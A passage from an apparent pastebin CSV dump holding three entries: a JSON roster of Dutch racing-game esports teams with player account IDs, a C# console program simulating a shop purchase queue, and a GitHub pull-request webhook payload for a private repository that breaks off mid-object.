                ""AccountId"": ""c1fbedb5-292e-4440-8946-a48023090b4c"",
                ""Name"": ""Zeemuis"",
                ""PhotoUrl"": """"
            }
        ]
    },
    {
        ""Id"": ""limburgsemuur"",
        ""Name"": ""De Limburgse Muur"",
        ""ShortName"": ""LM"",
        ""LogoUrl"": """",
        ""CountryFlagUrl"": ""file://Media/Flags/NED.dds"",
        ""Messages"": {
            ""TrackPoint"": {
                ""Customize"": [
                    ""SoundUrl"",
                    ""MessageDelay""
                ],
                ""MessageDelay"": 700
            },
            ""TrackWin"": {
                ""Customize"": [
                    ""SoundUrl""
                ]
            }
        },
        ""Players"": [
            {
                ""AccountId"": ""bd872712-053a-4fbf-9ff2-1ec452be4fd6"",
                ""Name"": ""ChiliConArne."",
                ""PhotoUrl"": """"
            },
            {
                ""AccountId"": ""76f34c93-b0eb-446b-b212-60ffc35e317d"",
                ""Name"": ""TIMMYS.."",
                ""PhotoUrl"": """"
            }
        ]
    },
    {
        ""Id"": ""shagmania"",
        ""Name"": ""ShagMania"",
        ""ShortName"": ""SM"",
        ""LogoUrl"": """",
        ""CountryFlagUrl"": ""file://Media/Flags/NED.dds"",
        ""Messages"": {
            ""TrackPoint"": {
                ""Customize"": [
                    ""SoundUrl"",
                    ""MessageDelay""
                ],
                ""MessageDelay"": 700
            },
            ""TrackWin"": {
                ""Customize"": [
                    ""SoundUrl""
                ]
            }
        },
        ""Players"": [
            {
                ""AccountId"": ""0b11c365-4ae3-4644-95fb-1f49057ba558"",
                ""Name"": ""FootFungusTM"",
                ""PhotoUrl"": """"
            },
            {
                ""AccountId"": ""36415252-1c1a-4e9d-8a28-037e496eedbf"",
                ""Name"": ""ThyInvisDragon"",
                ""PhotoUrl"": """"
            }
        ]
    },
    {
        ""Id"": ""plattekangoeroes"",
        ""Name"": ""Platte Kangoeroes"",
        ""ShortName"": ""PK"",
        ""LogoUrl"": """",
        ""CountryFlagUrl"": ""file://Media/Flags/NED.dds"",
        ""Messages"": {
            ""TrackPoint"": {
                ""Customize"": [
                    ""SoundUrl"",
                    ""MessageDelay""
                ],
                ""MessageDelay"": 700
            },
            ""TrackWin"": {
                ""Customize"": [
                    ""SoundUrl""
                ]
            }
        },
        ""Players"": [
            {
                ""AccountId"": ""cf0bd43d-947b-4fec-b921-86231fbcd353"",
                ""Name"": ""IanStarTM"",
                ""PhotoUrl"": """"
            },
            {
                ""AccountId"": ""5c0d0a23-e236-4a69-b3f9-8d9040e461e9"",
                ""Name"": ""Tiezie"",
                ""PhotoUrl"": """"
            }
        ]
    },
    {
        ""Id"": ""molotovgaming"",
        ""Name"": ""Molotov Gaming"",
        ""ShortName"": ""MG"",
        ""LogoUrl"": """",
        ""CountryFlagUrl"": ""file://Media/Flags/NED.dds"",
        ""Messages"": {
            ""TrackPoint"": {
                ""Customize"": [
                    ""SoundUrl"",
                    ""MessageDelay""
                ],
                ""MessageDelay"": 700
            },
            ""TrackWin"": {
                ""Customize"": [
                    ""SoundUrl""
                ]
            }
        },
        ""Players"": [
            {
                ""AccountId"": ""79657676-be95-44bb-a0f5-20e08c2b2845"",
                ""Name"": ""BoinkTM"",
                ""PhotoUrl"": """"
            },
            {
                ""AccountId"": ""f6a8d496-779c-4237-9602-ef297e0b20d7"",
                ""Name"": ""Javzo"",
                ""PhotoUrl"": """"
            }
        ]
    },
    {
        ""Id"": ""poepmandarijn"",
        ""Name"": ""Poepmandarijn"",
        ""ShortName"": ""PM"",
        ""LogoUrl"": """",
        ""CountryFlagUrl"": ""file://Media/Flags/NED.dds"",
        ""Messages"": {
            ""TrackPoint"": {
                ""Customize"": [
                    ""SoundUrl"",
                    ""MessageDelay""
                ],
                ""MessageDelay"": 700
            },
            ""TrackWin"": {
                ""Customize"": [
                    ""SoundUrl""
                ]
            }
        },
        ""Players"": [
            {
                ""AccountId"": ""05e9d832-f5a7-4592-9340-bee92d31b259"",
                ""Name"": ""OHBIBOY"",
                ""PhotoUrl"": """"
            },
            {
                ""AccountId"": ""1a9d6bce-2787-4417-a500-f13d2544ecdf"",
                ""Name"": ""Poepboer"",
                ""PhotoUrl"": """"
            }
        ]
    },
    {
        ""Id"": ""karters"",
        ""Name"": ""Karters"",
        ""ShortName"": ""KAR"",
        ""LogoUrl"": """",
        ""CountryFlagUrl"": ""file://Media/Flags/NED.dds"",
        ""Messages"": {
            ""TrackPoint"": {
                ""Customize"": [
                    ""SoundUrl"",
                    ""MessageDelay""
                ],
                ""MessageDelay"": 700
            },
            ""TrackWin"": {
                ""Customize"": [
                    ""SoundUrl""
                ]
            }
        },
        ""Players"": [
            {
                ""AccountId"": ""b9333821-dd6f-4d7f-ab1c-f9f725f869c5"",
                ""Name"": ""callmejoeri"",
                ""PhotoUrl"": """"
            },
            {
                ""AccountId"": ""28cb0b0c-24ca-4d66-a369-d6d4c5988de8"",
                ""Name"": ""Tommie._"",
                ""PhotoUrl"": """"
            }
        ]
    },
    {
        ""Id"": ""lastminuteautism"",
        ""Name"": ""Last Minute Autism"",
        ""ShortName"": ""LMA"",
        ""LogoUrl"": """",
        ""CountryFlagUrl"": ""file://Media/Flags/NED.dds"",
        ""Messages"": {
            ""TrackPoint"": {
                ""Customize"": [
                    ""SoundUrl"",
                    ""MessageDelay""
                ],
                ""MessageDelay"": 700
            },
            ""TrackWin"": {
                ""Customize"": [
                    ""SoundUrl""
                ]
            }
        },
        ""Players"": [
            {
                ""AccountId"": ""8ba50c35-3488-4ea5-a5ea-6acc4acc2479"",
                ""Name"": ""markdeotter"",
                ""PhotoUrl"": """"
            },
            {
                ""AccountId"": ""2cd863d3-b76c-479c-b3ca-edbd3321e285"",
                ""Name"": ""yannickieboy15"",
                ""PhotoUrl"": """"
            }
        ]
    }
]"
8Aj9aXxT,ShopQueue,SaNik74,C#,Thursday 20th of June 2024 02:26:58 PM CDT,"namespace ShopQueue
{
    internal class Program
    {
        static void Main(string[] args)
        {
            int shopBalance = 0;

            Queue<int> purchase = new Queue<int>();

            FillQueue(purchase);
            SellProduct(purchase,ref shopBalance);
        }

        static void FillQueue(Queue<int> queue)
        {
            Random random = new Random();
            
            int maxNumbersPurchase = 20;
            int minNumbersPurchase = 1;
            int maxCostPurchase = 2000;
            int minCostPurchase = 1;

            int purchaseNumbers = random.Next(minNumbersPurchase, maxNumbersPurchase + 1);
           
            for (int i = 0; i < purchaseNumbers; i++)
            {
                queue.Enqueue(random.Next(minCostPurchase, maxCostPurchase));
            }
        }

        static void SellProduct(Queue<int> queue, ref int shopBalance)
        {
           while(queue.Count > 0)
            {
                OutputQueue(queue);
                Console.WriteLine($""–ù–∞ –±–∞–ª–∞–Ω—Å–µ {shopBalance}."");
                shopBalance += queue.Dequeue();
                Console.ReadKey();
                Console.Clear();
            }
        }

        static void OutputQueue(Queue<int> queue)
        {
            Console.WriteLine(""–°—Ç–æ–∏–º–æ—Å—Ç—å –∫–∞–∂–¥–æ–π –ø–æ–∫—É–ø–∫–∏ –≤ –æ—á–µ—Ä–µ–¥–∏"");
            
            foreach (int pricePurchse in queue)
            {
                Console.Write(pricePurchse + ""||"");
            }

            Console.WriteLine();
        }
    }
}"
8PkgVuMa,Pr Com Erro,wesdrum,JSON,Thursday 20th of June 2024 02:11:00 PM CDT,"{
  ""action"": ""closed"",
  ""number"": 4309,
  ""pull_request"": {
    ""url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/pulls/4309"",
    ""id"": 1931190046,
    ""node_id"": ""PR_kwDOF4xvBc5zG58e"",
    ""html_url"": ""https://github.com/hetosoft/ProjetosSol.NET/pull/4309"",
    ""diff_url"": ""https://github.com/hetosoft/ProjetosSol.NET/pull/4309.diff"",
    ""patch_url"": ""https://github.com/hetosoft/ProjetosSol.NET/pull/4309.patch"",
    ""issue_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/issues/4309"",
    ""number"": 4309,
    ""state"": ""closed"",
    ""locked"": false,
    ""title"": ""Interface"",
    ""user"": {
      ""login"": ""wesProg23"",
      ""id"": 20547283,
      ""node_id"": ""MDQ6VXNlcjIwNTQ3Mjgz"",
      ""avatar_url"": ""https://avatars.githubusercontent.com/u/20547283?v=4"",
      ""gravatar_id"": """",
      ""url"": ""https://api.github.com/users/wesProg23"",
      ""html_url"": ""https://github.com/wesProg23"",
      ""followers_url"": ""https://api.github.com/users/wesProg23/followers"",
      ""following_url"": ""https://api.github.com/users/wesProg23/following{/other_user}"",
      ""gists_url"": ""https://api.github.com/users/wesProg23/gists{/gist_id}"",
      ""starred_url"": ""https://api.github.com/users/wesProg23/starred{/owner}{/repo}"",
      ""subscriptions_url"": ""https://api.github.com/users/wesProg23/subscriptions"",
      ""organizations_url"": ""https://api.github.com/users/wesProg23/orgs"",
      ""repos_url"": ""https://api.github.com/users/wesProg23/repos"",
      ""events_url"": ""https://api.github.com/users/wesProg23/events{/privacy}"",
      ""received_events_url"": ""https://api.github.com/users/wesProg23/received_events"",
      ""type"": ""User"",
      ""site_admin"": false
    },
    ""body"": ""#dev Sol.NET Convers√£o.\r\nAdicionado config para informar um Id de empresa alternativo para ser usado, caso o registro da origem n√£o tenha informado um ID_EMPRESA para ser convertido.\r\nhttps://prnt.sc/KOHLMq-I2iJ0"",
    ""created_at"": ""2024-06-20T19:08:33Z"",
    ""updated_at"": ""2024-06-20T19:08:41Z"",
    ""closed_at"": ""2024-06-20T19:08:41Z"",
    ""merged_at"": ""2024-06-20T19:08:41Z"",
    ""merge_commit_sha"": ""057f5139ad19bf40e7dcad80d97631841575172b"",
    ""assignee"": null,
    ""assignees"": [

    ],
    ""requested_reviewers"": [

    ],
    ""requested_teams"": [

    ],
    ""labels"": [

    ],
    ""milestone"": null,
    ""draft"": false,
    ""commits_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/pulls/4309/commits"",
    ""review_comments_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/pulls/4309/comments"",
    ""review_comment_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/pulls/comments{/number}"",
    ""comments_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/issues/4309/comments"",
    ""statuses_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/statuses/a074037b053bd0002a29053d5f16fe26a057de8a"",
    ""head"": {
      ""label"": ""hetosoft:ConversaoEmpresaAlternativa"",
      ""ref"": ""ConversaoEmpresaAlternativa"",
      ""sha"": ""a074037b053bd0002a29053d5f16fe26a057de8a"",
      ""user"": {
        ""login"": ""hetosoft"",
        ""id"": 53792964,
        ""node_id"": ""MDEyOk9yZ2FuaXphdGlvbjUzNzkyOTY0"",
        ""avatar_url"": ""https://avatars.githubusercontent.com/u/53792964?v=4"",
        ""gravatar_id"": """",
        ""url"": ""https://api.github.com/users/hetosoft"",
        ""html_url"": ""https://github.com/hetosoft"",
        ""followers_url"": ""https://api.github.com/users/hetosoft/followers"",
        ""following_url"": ""https://api.github.com/users/hetosoft/following{/other_user}"",
        ""gists_url"": ""https://api.github.com/users/hetosoft/gists{/gist_id}"",
        ""starred_url"": ""https://api.github.com/users/hetosoft/starred{/owner}{/repo}"",
        ""subscriptions_url"": ""https://api.github.com/users/hetosoft/subscriptions"",
        ""organizations_url"": ""https://api.github.com/users/hetosoft/orgs"",
        ""repos_url"": ""https://api.github.com/users/hetosoft/repos"",
        ""events_url"": ""https://api.github.com/users/hetosoft/events{/privacy}"",
        ""received_events_url"": ""https://api.github.com/users/hetosoft/received_events"",
        ""type"": ""Organization"",
        ""site_admin"": false
      },
      ""repo"": {
        ""id"": 395079429,
        ""node_id"": ""MDEwOlJlcG9zaXRvcnkzOTUwNzk0Mjk="",
        ""name"": ""ProjetosSol.NET"",
        ""full_name"": ""hetosoft/ProjetosSol.NET"",
        ""private"": true,
        ""owner"": {
          ""login"": ""hetosoft"",
          ""id"": 53792964,
          ""node_id"": ""MDEyOk9yZ2FuaXphdGlvbjUzNzkyOTY0"",
          ""avatar_url"": ""https://avatars.githubusercontent.com/u/53792964?v=4"",
          ""gravatar_id"": """",
          ""url"": ""https://api.github.com/users/hetosoft"",
          ""html_url"": ""https://github.com/hetosoft"",
          ""followers_url"": ""https://api.github.com/users/hetosoft/followers"",
          ""following_url"": ""https://api.github.com/users/hetosoft/following{/other_user}"",
          ""gists_url"": ""https://api.github.com/users/hetosoft/gists{/gist_id}"",
          ""starred_url"": ""https://api.github.com/users/hetosoft/starred{/owner}{/repo}"",
          ""subscriptions_url"": ""https://api.github.com/users/hetosoft/subscriptions"",
          ""organizations_url"": ""https://api.github.com/users/hetosoft/orgs"",
          ""repos_url"": ""https://api.github.com/users/hetosoft/repos"",
          ""events_url"": ""https://api.github.com/users/hetosoft/events{/privacy}"",
          ""received_events_url"": ""https://api.github.com/users/hetosoft/received_events"",
          ""type"": ""Organization"",
          ""site_admin"": false
        },
        ""html_url"": ""https://github.com/hetosoft/ProjetosSol.NET"",
        ""description"": ""Projetos Su√≠te Sol.NET Desktop Windows"",
        ""fork"": false,
        ""url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET"",
        ""forks_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/forks"",
        ""keys_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/keys{/key_id}"",
        ""collaborators_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/collaborators{/collaborator}"",
        ""teams_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/teams"",
        ""hooks_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/hooks"",
        ""issue_events_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/issues/events{/number}"",
        ""events_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/events"",
        ""assignees_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/assignees{/user}"",
        ""branches_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/branches{/branch}"",
        ""tags_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/tags"",
        ""blobs_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/git/blobs{/sha}"",
        ""git_tags_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/git/tags{/sha}"",
        ""git_refs_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/git/refs{/sha}"",
        ""trees_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/git/trees{/sha}"",
        ""statuses_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/statuses/{sha}"",
        ""languages_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/languages"",
        ""stargazers_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/stargazers"",
        ""contributors_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/contributors"",
        ""subscribers_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/subscribers"",
        ""subscription_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/subscription"",
        ""commits_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/commits{/sha}"",
        ""git_commits_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/git/commits{/sha}"",
        ""comments_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/comments{/number}"",
        ""issue_comment_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/issues/comments{/number}"",
        ""contents_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/contents/{+path}"",
        ""compare_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/compare/{base}...{head}"",
        ""merges_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/merges"",
        ""archive_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/{archive_format}{/ref}"",
        ""downloads_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/downloads"",
        ""issues_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/issues{/number}"",
        ""pulls_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/pulls{/number}"",
        ""milestones_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/milestones{/number}"",
        ""notifications_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/notifications{?since,all,participating}"",
        ""labels_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/labels{/name}"",
        ""releases_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/releases{/id}"",
        ""deployments_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/deployments"",
        ""created_at"": ""2021-08-11T18:14:44Z"",
        ""updated_at"": ""2024-06-20T16:55:46Z"",
        ""pushed_at"": ""2024-06-20T19:08:34Z"",
        ""git_url"": ""git://github.com/hetosoft/ProjetosSol.NET.git"",
        ""ssh_url"": ""git@github.com:hetosoft/ProjetosSol.NET.git"",
        ""clone_url"": ""https://github.com/hetosoft/ProjetosSol.NET.git"",
        ""svn_url"": ""https://github.com/hetosoft/ProjetosSol.NET"",
        ""homepage"": """",
        ""size"": 116591,
        ""stargazers_count"": 0,
        ""watchers_count"": 0,
        ""language"": ""Pascal"",
        ""has_issues"": true,
        ""has_projects"": true,
        ""has_downloads"": true,
        ""has_wiki"": true,
        ""has_pages"": false,
        ""has_discussions"": true,
        ""forks_count"": 0,
        ""mirror_url"": null,
        ""archived"": false,
        ""disabled"": false,
        ""open_issues_count"": 26,
        ""license"": null,
        ""allow_forking"": false,
        ""is_template"": false,
        ""web_commit_signoff_required"": false,
        ""topics"": [

        ],
        ""visibility"": ""private"",
        ""forks"": 0,
        ""open_issues"": 26,
        ""watchers"": 0,
        ""default_branch"": ""develop"",
        ""allow_squash_merge"": true,
        ""allow_merge_commit"": false,
        ""allow_rebase_merge"": false,
        ""allow_auto_merge"": false,
        ""delete_branch_on_merge"": false,
        ""allow_update_branch"": true,
        ""use_squash_pr_title_as_default"": true,
        ""squash_merge_commit_message"": ""PR_BODY"",
        ""squash_merge_commit_title"": ""PR_TITLE"",
        ""merge_commit_message"": ""PR_TITLE"",
        ""merge_commit_title"": ""MERGE_MESSAGE""
      }
    },
    ""base"": {
      ""label"": ""hetosoft:develop"",
      ""ref"": ""develop"",
      ""sha"": ""cf4074bc21c735f0059ca75a83a74e77b5fd59ba"",
      ""user"": {
        ""login"": ""hetosoft"",
        ""id"": 53792964,
        ""node_id"": ""MDEyOk9yZ2FuaXphdGlvbjUzNzkyOTY0"",
        ""avatar_url"": ""https://avatars.githubusercontent.com/u/53792964?v=4"",
        ""gravatar_id"": """",
        ""url"": ""https://api.github.com/users/hetosoft"",
        ""html_url"": ""https://github.com/hetosoft"",
        ""followers_url"": ""https://api.github.com/users/hetosoft/followers"",
        ""following_url"": ""https://api.github.com/users/hetosoft/following{/other_user}"",
        ""gists_url"": ""https://api.github.com/users/hetosoft/gists{/gist_id}"",
        ""starred_url"": ""https://api.github.com/users/hetosoft/starred{/owner}{/repo}"",
        ""subscriptions_url"": ""https://api.github.com/users/hetosoft/subscriptions"",
        ""organizations_url"": ""https://api.github.com/users/hetosoft/orgs"",
        ""repos_url"": ""https://api.github.com/users/hetosoft/repos"",
        ""events_url"": ""https://api.github.com/users/hetosoft/events{/privacy}"",
        ""received_events_url"": ""https://api.github.com/users/hetosoft/received_events"",
        ""type"": ""Organization"",
        ""site_admin"": false
      },
      ""repo"": {
        ""id"": 395079429,
        ""node_id"": ""MDEwOlJlcG9zaXRvcnkzOTUwNzk0Mjk="",
        ""name"": ""ProjetosSol.NET"",
        ""full_name"": ""hetosoft/ProjetosSol.NET"",
        ""private"": true,
        ""owner"": {
          ""login"": ""hetosoft"",
          ""id"": 53792964,
          ""node_id"": ""MDEyOk9yZ2FuaXphdGlvbjUzNzkyOTY0"",
          ""avatar_url"": ""https://avatars.githubusercontent.com/u/53792964?v=4"",
          ""gravatar_id"": """",
          ""url"": ""https://api.github.com/users/hetosoft"",
          ""html_url"": ""https://github.com/hetosoft"",
          ""followers_url"": ""https://api.github.com/users/hetosoft/followers"",
          ""following_url"": ""https://api.github.com/users/hetosoft/following{/other_user}"",
          ""gists_url"": ""https://api.github.com/users/hetosoft/gists{/gist_id}"",
          ""starred_url"": ""https://api.github.com/users/hetosoft/starred{/owner}{/repo}"",
          ""subscriptions_url"": ""https://api.github.com/users/hetosoft/subscriptions"",
          ""organizations_url"": ""https://api.github.com/users/hetosoft/orgs"",
          ""repos_url"": ""https://api.github.com/users/hetosoft/repos"",
          ""events_url"": ""https://api.github.com/users/hetosoft/events{/privacy}"",
          ""received_events_url"": ""https://api.github.com/users/hetosoft/received_events"",
          ""type"": ""Organization"",
          ""site_admin"": false
        },
        ""html_url"": ""https://github.com/hetosoft/ProjetosSol.NET"",
        ""description"": ""Projetos Su√≠te Sol.NET Desktop Windows"",
        ""fork"": false,
        ""url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET"",
        ""forks_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/forks"",
        ""keys_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/keys{/key_id}"",
        ""collaborators_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/collaborators{/collaborator}"",
        ""teams_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/teams"",
        ""hooks_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/hooks"",
        ""issue_events_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/issues/events{/number}"",
        ""events_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/events"",
        ""assignees_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/assignees{/user}"",
        ""branches_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/branches{/branch}"",
        ""tags_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/tags"",
        ""blobs_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/git/blobs{/sha}"",
        ""git_tags_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/git/tags{/sha}"",
        ""git_refs_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/git/refs{/sha}"",
        ""trees_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/git/trees{/sha}"",
        ""statuses_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/statuses/{sha}"",
        ""languages_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/languages"",
        ""stargazers_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/stargazers"",
        ""contributors_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/contributors"",
        ""subscribers_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/subscribers"",
        ""subscription_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/subscription"",
        ""commits_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/commits{/sha}"",
        ""git_commits_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/git/commits{/sha}"",
        ""comments_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/comments{/number}"",
        ""issue_comment_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/issues/comments{/number}"",
        ""contents_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/contents/{+path}"",
        ""compare_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/compare/{base}...{head}"",
        ""merges_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/merges"",
        ""archive_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/{archive_format}{/ref}"",
        ""downloads_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/downloads"",
        ""issues_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/issues{/number}"",
        ""pulls_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/pulls{/number}"",
        ""milestones_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/milestones{/number}"",
        ""notifications_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/notifications{?since,all,participating}"",
        ""labels_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/labels{/name}"",
        ""releases_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/releases{/id}"",
        ""deployments_url"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/deployments"",
        ""created_at"": ""2021-08-11T18:14:44Z"",
        ""updated_at"": ""2024-06-20T16:55:46Z"",
        ""pushed_at"": ""2024-06-20T19:08:34Z"",
        ""git_url"": ""git://github.com/hetosoft/ProjetosSol.NET.git"",
        ""ssh_url"": ""git@github.com:hetosoft/ProjetosSol.NET.git"",
        ""clone_url"": ""https://github.com/hetosoft/ProjetosSol.NET.git"",
        ""svn_url"": ""https://github.com/hetosoft/ProjetosSol.NET"",
        ""homepage"": """",
        ""size"": 116591,
        ""stargazers_count"": 0,
        ""watchers_count"": 0,
        ""language"": ""Pascal"",
        ""has_issues"": true,
        ""has_projects"": true,
        ""has_downloads"": true,
        ""has_wiki"": true,
        ""has_pages"": false,
        ""has_discussions"": true,
        ""forks_count"": 0,
        ""mirror_url"": null,
        ""archived"": false,
        ""disabled"": false,
        ""open_issues_count"": 26,
        ""license"": null,
        ""allow_forking"": false,
        ""is_template"": false,
        ""web_commit_signoff_required"": false,
        ""topics"": [

        ],
        ""visibility"": ""private"",
        ""forks"": 0,
        ""open_issues"": 26,
        ""watchers"": 0,
        ""default_branch"": ""develop"",
        ""allow_squash_merge"": true,
        ""allow_merge_commit"": false,
        ""allow_rebase_merge"": false,
        ""allow_auto_merge"": false,
        ""delete_branch_on_merge"": false,
        ""allow_update_branch"": true,
        ""use_squash_pr_title_as_default"": true,
        ""squash_merge_commit_message"": ""PR_BODY"",
        ""squash_merge_commit_title"": ""PR_TITLE"",
        ""merge_commit_message"": ""PR_TITLE"",
        ""merge_commit_title"": ""MERGE_MESSAGE""
      }
    },
    ""_links"": {
      ""self"": {
        ""href"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/pulls/4309""
      },
      ""html"": {
        ""href"": ""https://github.com/hetosoft/ProjetosSol.NET/pull/4309""
      },
      ""issue"": {
        ""href"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/issues/4309""
      },
      ""comments"": {
        ""href"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/issues/4309/comments""
      },
      ""review_comments"": {
        ""href"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/pulls/4309/comments""
      },
      ""review_comment"": {
        ""href"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/pulls/comments{/number}""
      },
      ""commits"": {
        ""href"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/pulls/4309/commits""
      },
      ""statuses"": {
        ""href"": ""https://api.github.com/repos/hetosoft/ProjetosSol.NET/statuses/a074037b053bd0002a29053d5f16fe26a057de8a""
      }
    },
    ""author_association"": ""COLLABORATOR"",
    ""auto_merge"": null,
    ""active_lock_reason"": null,
    ""merged"": true,
    ""mergeable"": null,
    ""rebaseable"": null,
    ""mergeable_state"": ""unknown"",
    ""merged_by"": {
      ""login"": ""wesProg23"",
      ""id"": 20547283,
      ""node_id"": ""MDQ6VXNlcjIwNTQ3Mjgz"",
      ""avatar_url"": ""https://avatars.githubusercontent.com/u/20547283?v=4"",
      ""gravatar_id"": """",
      ""url"": ""https://api.github.com/users/wesProg23"",
      ""html_url"": ""https://github.com/wesProg23"",
      ""followers_url"": ""https://api.github.com/users/wesProg23/followers"",
      ""following_url"": ""https://api.github.com/users/wesProg23/following{/other_user}"",
      ""gists_url"": ""https://api.github.com/users/wesProg23/gists{/gist_id}"",
      ""starred_url"": ""https://api.github.com/users/wesProg23/starred{/owner}{/repo}"",
      ""subscriptions_url"": ""https://api.github.com/users/wesProg23/subscriptions"",
      ""organizations_url"": ""https://api.github.com/users/wesProg23/orgs"",
      ""repos_url"": ""https://api.github.com/users/wesProg23/repos"",
      ""events_url"": ""https://api.github.com/users/wesProg23/events{/privacy}"",
      ""received_events_url"": ""https://api.github.com/users/wesProg23/received_events"",
      ""type"": ""User"",
      ""site_admin"": false
    },
    ""comments"": 0,
    ""review_comments"": 0,
    ""maintainer_can_modify"": false,
    ""commits"": 1,
    ""additions"": 142,
    ""deletions"": 11,
    ""changed_files"": 3
  },
  ""repository"": {
    ""id"": 395079429,
    ""node_id"": ""MDEwOlJlcG9zaXRvcnkzOTUwNzk0Mjk="",
    ""name"": ""ProjetosSol.NET"",
    ""full_name"": ""hetosoft/ProjetosSol.NET"",
    ""private"": true,
    ""owner"": {
      ""login"": ""hetosoft"",
      ""id"": 53792964,
      ""node_id"": ""MDEyOk9yZ2FuaXphdGlvbjUzNzkyOTY0"",
      ""avatar_url"": ""https://avatars.githubusercontent.com/u/53792964?v=4"",
      ""gravatar_id"": """",
      ""url"": ""https://api.github.com/users/hetosoft"",
      ""html_url"": ""https://github.com/hetosoft"",
      ""followers_url"": ""https://api.github.com/users/hetosoft/followers"",
      ""following_url"": ""https://api.github.com/users/hetosoft/following{/other_user}"",
      ""gists_url"": ""https://api.github.com/users/hetosoft/gists{/gist_id}"",
      ""starred_url"": ""https://api.github.com/users/hetosoft/starred{/owner}{/repo}"",
      ""subscriptions_url"": ""https://api.github.com/users/hetosoft/subscriptions"",
      ""organizations_url"": ""https://api.github.com/users/hetosoft/orgs"",
      ""repos_url"": ""https://api.github.com/users/hetosoft/repos"",
      ""events_url"": ""https://api.github.com/users/hetosoft/events{/privacy}"",
      ""received_events_url"": ""https://api.github.com/users/hetosoft/received_events"",
      ""type"": ""Organization"",
      ""site_admin"": false
    },
    ""html_url"": ""https://github.com/hetosoft/ProjetosSol.NET"",
